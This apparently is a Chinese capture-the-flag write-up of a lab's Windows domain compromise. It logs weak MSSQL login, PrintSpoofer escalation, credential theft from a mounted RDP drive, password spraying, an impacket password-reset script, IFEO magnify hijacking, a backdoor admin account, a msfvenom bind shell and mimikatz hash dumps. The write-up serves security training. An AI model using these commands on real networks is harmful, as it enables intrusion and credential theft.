# Tsclient
!!! note

    春秋云镜中一套难度中等的域渗透靶场，可以进一步熟悉域中的渗透流程。
    笔记主要对流程、命令进行记录。
`提权`:fontawesome-solid-tag:

## 资产探测
```
┌──(nama㉿Nama)-[/usr/share/windows-resources/mimikatz]
└─$ nmap 39.98.115.192
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-07 13:18 CST
Nmap scan report for 39.98.115.192
Host is up (0.011s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
80/tcp   open     http
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  filtered microsoft-ds
1433/tcp open     ms-sql-s
2383/tcp open     ms-olap4
3389/tcp open     ms-wbt-server
4444/tcp filtered krb524
5800/tcp filtered vnc-http
5900/tcp filtered vnc

Nmap done: 1 IP address (1 host up) scanned in 3.82 seconds

[*] alive ports len is: 218
start vulscan
[*] WebTitle: http://39.98.115.192      code:200 len:703    title:IIS Windows Server
[*] NetInfo:
[*]39.98.115.192
   [->]WIN-WEB
   [->]172.22.8.18
[+] mssql:39.98.115.192:1433:sa 1qaz!QAZ
```

对开放端口进一步详细探测
```
┌──(nama㉿Nama)-[/usr/share/windows-resources/mimikatz]
└─$ sudo nmap -sS -sV -sC -O -p80,1433,2383,3389 39.98.115.192
[sudo] password for nama:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-07 13:37 CST
Nmap scan report for 39.98.115.192
Host is up (0.010s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-info:
|   39.98.115.192:1433:
|     Version:
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-11-07T05:38:36+00:00; +1s from scanner time.
| ms-sql-ntlm-info:
|   39.98.115.192:1433:
|     Target_Name: WIN-WEB
|     NetBIOS_Domain_Name: WIN-WEB
|     NetBIOS_Computer_Name: WIN-WEB
|     DNS_Domain_Name: WIN-WEB
|     DNS_Computer_Name: WIN-WEB
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-11-07T05:17:52
|_Not valid after:  2053-11-07T05:17:52
2383/tcp open  ms-olap4?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-WEB
|   NetBIOS_Domain_Name: WIN-WEB
|   NetBIOS_Computer_Name: WIN-WEB
|   DNS_Domain_Name: WIN-WEB
|   DNS_Computer_Name: WIN-WEB
|   Product_Version: 10.0.14393
|_  System_Time: 2023-11-07T05:38:31+00:00
| ssl-cert: Subject: commonName=WIN-WEB
| Not valid before: 2023-11-06T05:17:41
|_Not valid after:  2024-05-07T05:17:41
|_ssl-date: 2023-11-07T05:38:36+00:00; +1s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|7|2016 (90%)
OS CPE: cpe:/o:microsoft:windows_10:1607 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows 10 1607 (90%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 7 Professional (87%), Microsoft Windows Server 2016 (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.22 seconds
```
## mssql 弱口令 getshell

mssql getshell
??? note
    好用的数据库的集成利用工具[MDUT](https://github.com/SafeGroceryStore/MDUT/)

上vhell,收集基本信息
```
C:\Windows\system32>whoami /all

用户信息
----------------

用户名                 SID
====================== ===============================================================
nt service\mssqlserver S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003


组信息
-----------------

组名                                 类型   SID                                            属性
==================================== ====== ============================================== ==============================
Mandatory Label\High Mandatory Level 标签   S-1-16-12288
Everyone                             已知组 S-1-1-0                                        必需的组, 启用于默认, 启用的组
WIN-WEB\PdwComputeNodeAccess         别名   S-1-5-21-4088072006-1921831747-1237773115-1003 必需的组, 启用于默认, 启用的组
BUILTIN\Performance Monitor Users    别名   S-1-5-32-558                                   必需的组, 启用于默认, 启用的组
BUILTIN\Users                        别名   S-1-5-32-545                                   必需的组, 启用于默认, 启用的组
NT AUTHORITY\SERVICE                 已知组 S-1-5-6                                        必需的组, 启用于默认, 启用的组
CONSOLE LOGON                        已知组 S-1-2-1                                        必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users     已知组 S-1-5-11                                       必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization       已知组 S-1-5-15                                       必需的组, 启用于默认, 启用的组
LOCAL                                已知组 S-1-2-0                                        必需的组, 启用于默认, 启用的组
NT SERVICE\ALL SERVICES              已知组 S-1-5-80-0                                     必需的组, 启用于默认, 启用的组


特权信息
----------------------

特权名                        描述                 状态
============================= ==================== ======
SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeImpersonatePrivilege        身份验证后模拟客户端 已启用
SeCreateGlobalPrivilege       创建全局对象         已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用

错误: 无法获取用户声明信息。

C:\Windows\system32>ipconfig /all

Windows IP 配置

   主机名  . . . . . . . . . . . . . : WIN-WEB
   主 DNS 后缀 . . . . . . . . . . . :
   节点类型  . . . . . . . . . . . . : 混合
   IP 路由已启用 . . . . . . . . . . : 否
   WINS 代理已启用 . . . . . . . . . : 否

以太网适配器 以太网 2:

   连接特定的 DNS 后缀 . . . . . . . :
   描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter #2
   物理地址. . . . . . . . . . . . . : 00-16-3E-24-92-A4
   DHCP 已启用 . . . . . . . . . . . : 是
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::f5c2:513:90bc:51cc%8(首选)
   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18(首选)
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   获得租约的时间  . . . . . . . . . : 2023年11月7日 13:17:40
   租约过期的时间  . . . . . . . . . : 2033年11月4日 13:17:40
   默认网关. . . . . . . . . . . . . : 172.22.255.253
   DHCP 服务器 . . . . . . . . . . . : 172.22.255.253
   DHCPv6 IAID . . . . . . . . . . . : 251663934
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-2A-5D-63-2D-00-16-3E-04-77-EC
   DNS 服务器  . . . . . . . . . . . : 100.100.2.136
                                       100.100.2.138
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

隧道适配器 Teredo Tunneling Pseudo-Interface:

   连接特定的 DNS 后缀 . . . . . . . :
   描述. . . . . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:2c26:1d4:d89d:8c3f(首选)
   本地链接 IPv6 地址. . . . . . . . : fe80::2c26:1d4:d89d:8c3f%12(首选)
   默认网关. . . . . . . . . . . . . : ::
   DHCPv6 IAID . . . . . . . . . . . : 134217728
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-2A-5D-63-2D-00-16-3E-04-77-EC
   TCPIP 上的 NetBIOS  . . . . . . . : 已禁用

隧道适配器 isatap.{7901C223-3BC4-42B0-BD21-258AA6858209}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是

C:\Windows\system32>systeminfo

主机名:           WIN-WEB
OS 名称:          Microsoft Windows Server 2016 Datacenter
OS 版本:          10.0.14393 暂缺 Build 14393
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:
注册的组织:       Aliyun
产品 ID:          00376-40000-00000-AA947
初始安装日期:     2022/7/11, 12:46:14
系统启动时间:     2023/11/7, 13:17:24
系统制造商:       Alibaba Cloud
系统型号:         Alibaba Cloud ECS
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2500 Mhz
BIOS 版本:        SeaBIOS 449e491, 2014/4/1
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     4,095 MB
可用的物理内存:   1,591 MB
虚拟内存: 最大值: 4,799 MB
虚拟内存: 可用:   1,235 MB
虚拟内存: 使用中: 3,564 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       暂缺
修补程序:         安装了 6 个修补程序。
                  [01]: KB5013625
                  [02]: KB4049065
                  [03]: KB4486129
                  [04]: KB4486131
                  [05]: KB5014026
                  [06]: KB5013952
网卡:             安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名:      以太网 2
                      启用 DHCP:   是
                      DHCP 服务器: 172.22.255.253
                      IP 地址
                        [01]: 172.22.8.18
                        [02]: fe80::f5c2:513:90bc:51cc
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
```


## 内网扫描
```
C:\迅雷下载>fscan64.exe -h 172.22.8.18/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.8.46     is alive
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.15     is alive
[*] Icmp alive hosts len is: 4
172.22.8.18:1433 open
172.22.8.15:445 open
172.22.8.15:135 open
172.22.8.31:445 open
172.22.8.18:445 open
172.22.8.46:445 open
172.22.8.15:139 open
172.22.8.31:139 open
172.22.8.18:139 open
172.22.8.46:139 open
172.22.8.31:135 open
172.22.8.18:135 open
172.22.8.46:135 open
172.22.8.18:80 open
172.22.8.46:80 open
172.22.8.15:88 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo:
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] NetInfo:
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] NetInfo:
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[*] NetBios: 172.22.8.15     [+]DC XIAORANG\DC01
[*] NetBios: 172.22.8.31     XIAORANG\WIN19-CLIENT
[*] NetInfo:
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
[*] NetBios: 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[*] WebTitle: http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ
已完成 16/16
[*] 扫描结束,耗时: 11.7900624s
```
!!! note
    Server 2016 提权[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
    `PrintSpoofer.exe -i -c cmd`

```
C:\Windows\system32>dir C:\Users\Administrator\flag\flag01.txt
 驱动器 C 中的卷没有标签。
 卷的序列号是 4659-5697

 C:\Users\Administrator\flag 的目录

2023/11/07  13:18               794 flag01.txt
               1 个文件            794 字节
               0 个目录 28,301,676,544 可用字节

C:\Windows\system32>type C:\Users\Administrator\flag\flag01.txt
 _________  ________  ________  ___       ___  _______   ________   _________
|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\
\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_|
     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \
      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \
       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|
              \|_________|


Getting flag01 is easy, right?

flag01: flag{d9559128-76f4-4cd7-ace1-521d28c15be4}

Maybe you should focus on user sessions...
```
## 横向渗透

查看 query user
发现 john的rdp，
net user ,net user john
```
C:\迅雷下载>query user
 用户名                会话名             ID  状态    空闲时间   登录时间
 john                  rdp-tcp#0           2  运行中       1:34  2023/11/7 13:19

C:\迅雷下载>net user

\\ 的用户帐户

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
John
命令运行完毕，但发生一个或多个错误。


C:\迅雷下载>net user john
用户名                 John
全名
注释
用户的注释
国家/地区代码          000 (系统默认值)
帐户启用               Yes
帐户到期               从不

上次设置密码           2022/7/11 15:56:37
密码到期               从不
密码可更改             2022/7/11 15:56:37
需要密码               Yes
用户可以更改密码       Yes

允许的工作站           All
登录脚本
用户配置文件
主目录
上次登录               2023/11/7 13:19:19

可允许的登录小时数     All

本地组成员             *Administrators       *Remote Desktop Users
                       *Users
全局组成员             *None
命令成功完成。
```

发现john是可以rdp的admin

cs注入一个john的会话，上vshell，查看net use

发现有远程目录挂载
```
C:\Windows\system32>net use
会记录新的网络连接。


状态       本地        远程                      网络

-------------------------------------------------------------------------------
                       \\TSCLIENT\C              Microsoft Terminal Services
命令成功完成。


C:\Windows\system32>net use \\TSCLIENT\C
命令成功完成。

C:\Windows\system32>dir \\TSCLIENT\C
 驱动器 \\TSCLIENT\C 中的卷没有标签。
 卷的序列号是 C2C5-9D0C

 \\TSCLIENT\C 的目录

2022/07/12  10:34                71 credential.txt
2022/05/12  17:04    <DIR>          PerfLogs
2022/07/11  12:53    <DIR>          Program Files
2022/05/18  11:30    <DIR>          Program Files (x86)
2022/07/11  12:47    <DIR>          Users
2022/07/11  12:45    <DIR>          Windows
               1 个文件             71 字节
               5 个目录 30,063,144,960 可用字节

C:\Windows\system32>dir \\TSCLIENT\C\credential.txt
 驱动器 \\TSCLIENT\C 中的卷没有标签。
 卷的序列号是 C2C5-9D0C

 \\TSCLIENT\C 的目录

2022/07/12  10:34                71 credential.txt
               1 个文件             71 字节
               0 个目录 30,063,144,960 可用字节

C:\Windows\system32>type \\TSCLIENT\C\credential.txt
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

发现保存的疑似登录信息

crackmapexec 尝试遍历（密码喷洒）

```
┌──(nama㉿Nama)-[/usr/share/windows-resources/mimikatz]
└─$ proxychains -q -f /etc/proxy.conf crackmapexec smb 172.22.8.0/24 -u "Aldrich" -p 'Ald@rLMWuy7Z!#'
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10.0 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.15     445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
```

提示密码过期，无法登录，尝试改密码
??? note "远程重置过期密码"
    [红队技巧-远程重置过期密码](https://forum.butian.net/share/865)


```
┌──(nama㉿Nama)-[/mnt/d/home/tools]
└─$ proxychains -f /etc/proxy.conf python3 setsmbpasswd.py "Aldrich" 'Ald@rLMWuy7Z!#' 'ajffHE@213nc34n'  172.22.8.15
[proxychains] config file found: /etc/proxy.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  123.57.193.197:8024  ...  172.22.8.15:445  ...  OK
SamrUnicodeChangePasswordUser2Response
ErrorCode:                       0
```
??? note "重置密码的脚本"
    ```py
    #!/usr/bin/python3
    
    from argparse import ArgumentParser
    
    from impacket.dcerpc.v5 import transport, samr
    
    def connect(host_name_or_ip):
        rpctransport = transport.SMBTransport(host_name_or_ip, filename=r'\samr')
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username='', password='', domain='', lmhash='', nthash='', aesKey='') # null session
    
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
    
        return dce
    
    def hSamrUnicodeChangePasswordUser2(username, oldpass, newpass, target):
        dce = connect(target)
        resp = samr.hSamrUnicodeChangePasswordUser2(dce, '\x00', username, oldpass, newpass)
        resp.dump()
    
    parser = ArgumentParser()
    parser.add_argument('username', help='username to change password for')
    parser.add_argument('oldpass', help='old password')
    parser.add_argument('newpass', help='new password')
    parser.add_argument('target', help='hostname or IP')
    args = parser.parse_args()
    
    hSamrUnicodeChangePasswordUser2(args.username, args.oldpass, args.newpass, args.target)
    ```

rdp 到 WIN2016
powershell 查看 acl。
可以[IFEO 劫持](https://www.heetian.com/info/657)
```
PS C:\Users\Aldrich> get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *


PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName             : Image File Execution Options
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry
CentralAccessPolicyId   :
CentralAccessPolicyName :
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
Owner                   : NT AUTHORITY\SYSTEM
Group                   : NT AUTHORITY\SYSTEM
Access                  : {System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.Reg
                          istryAccessRule...}
Sddl                    : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)(A;CI;KR;;;AC)
AccessToString          : CREATOR OWNER Allow  FullControl
                          NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey
                          NT AUTHORITY\SYSTEM Allow  FullControl
                          BUILTIN\Administrators Allow  FullControl
                          BUILTIN\Users Allow  ReadKey
                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
AuditToString           :
AccessRightType         : System.Security.AccessControl.RegistryRights
AccessRuleType          : System.Security.AccessControl.RegistryAccessRule
AuditRuleType           : System.Security.AccessControl.RegistryAuditRule
AreAccessRulesProtected : True
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True

```

劫持 magnify ，提权 system
```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```
增加一个管理用户
```
net user xiaorang.lab\name xxxx /add 
# 授权管理员权限
net localgroup Administrators name /add
```
```
Microsoft Windows [版本 10.0.14393]
(c) 2016 Microsoft Corporation。保留所有权利。

C:\Windows\system32>type C:\Users\Administrator\flag\flag02.txt
   . .    .       . .       . .       .      .       . .       . .       . .
.
.+'|=|`+.=|`+. .+'|=|`+. .+'|=|`+. .+'|      |`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=
|`+.
|.+' |  | `+.| |  | `+.| |  | `+.| |  |      |  | |  | `+.| |  | `+ | |.+' |  |
`+.|
     |  |      |  | .    |  |      |  |      |  | |  |=|`.  |  |  | |      |  |

     |  |      `+.|=|`+. |  |      |  |      |  | |  | `.|  |  |  | |      |  |

     |  |      .    |  | |  |    . |  |    . |  | |  |    . |  |  | |      |  |

     |  |      |`+. |  | |  | .+'| |  | .+'| |  | |  | .+'| |  |  | |      |  |

     |.+'      `+.|=|.+' `+.|=|.+' `+.|=|.+' |.+' `+.|=|.+' `+.|  |.|      |.+'





flag02: flag{92a27b6f-e898-45b3-9af6-16b867672be8}
```

没找到好用的proxy server，最后cs把.46的不出网的机器通过.18上线的。
!!! note
    现在找到了，[rsocx](https://github.com/b23r0/rsocx) rust写的。不过能用earthworm还是用earthworm。


msf 正向shell
```
msfvenom -p windows/meterpreter/bind_tcp -f exe -o shy.exe

use multi/handler
show options
set payload windows/meterpreter/bind_tcp
set host



load kiwi
发现机器是64位的，需要迁移到64位的进程
ps
migrate 4844
kiwi_cmd sekurlsa::logonpasswords

```

??? note "kiwi_cmd sekurlsa::logonpasswords"
    ```
    meterpreter > migrate 4844
    [*] Migrating from 4464 to 4844...
    [*] Migration completed successfully.
    meterpreter > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x64/windows)
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
    Success.
    meterpreter > kiwi_cmd sekurlsa::logonpasswords
    
    Authentication Id : 0 ; 24467071 (00000000:0175567f)
    Session           : Interactive from 2
    User Name         : DWM-2
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/11/7 16:07:25
    SID               : S-1-5-90-0-2
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 2e1664b283c4c7cca46e90addfe58af3
             * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f
            tspkg :sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:2e1664b283c4c7cca46e90addfe58af3
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : WIN2016$
             * Domain   : xiaorang.lab
             * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b
            ssp :
            credman :
    
    Authentication Id : 0 ; 14014692 (00000000:00d5d8e4)
    Session           : Service from 0
    User Name         : DefaultAppPool
    Domain            : IIS APPPOOL
    Logon Server      : (null)
    Logon Time        : 2023/11/7 14:04:19
    SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 2e1664b283c4c7cca46e90addfe58af3
             * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f
            tspkg :
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : WIN2016$
             * Domain   : xiaorang.lab
             * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b
            ssp :
            credman :
    
    Authentication Id : 0 ; 53809 (00000000:0000d231)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:27
    SID               : S-1-5-90-0-1
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a
             * SHA1     : e06238ecefc14d675f762b08a456770dc000f763
            tspkg :
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : WIN2016$
             * Domain   : xiaorang.lab
             * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e     f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3     bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61     23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40     fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea     e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a     a3 a6 05 64
            ssp :
            credman :
    
    Authentication Id : 0 ; 53779 (00000000:0000d213)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:27
    SID               : S-1-5-90-0-1
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 2e1664b283c4c7cca46e90addfe58af3
             * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f
            tspkg :
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : WIN2016$
             * Domain   : xiaorang.lab
